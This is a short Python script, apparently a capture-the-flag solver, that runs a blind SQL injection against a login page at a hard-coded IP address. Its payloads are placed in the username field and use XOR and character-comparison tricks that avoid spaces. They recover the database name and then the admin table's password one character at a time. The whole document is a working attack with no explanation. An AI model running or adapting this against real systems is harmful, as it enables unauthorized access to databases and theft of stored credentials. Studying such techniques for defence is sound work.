#!/usr/bin/env python
# coding=utf-8

import requests

url = 'http://123.206.31.85:49167/index.php'
s = requests.Session()
str_all="1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+-*/="

def database():
	result = ''
	for i in range(30):
		for j in str_all:
			payload = "'^(ascii(mid(database()from({})))<>{})#".format(str(i),ord(j))
			data = {
			'username' : payload,
			'password' : "123"
			}
			r = s.post(url,data=data)
			if 'error' in r.text:
				result +=j
				print result

def password():
	result = ''
	for i in range(33):
		for j in str_all:
			payload = "'^(ascii(mid((select(password)from(admin))from({})))<>{})#".format(str(i),ord(j))
			data = {
			'username' : payload,
			'password' : "123"
			}
			r = s.post(url,data=data)
			if 'error' in r.text:
				result +=j
				print result

#database()
password()
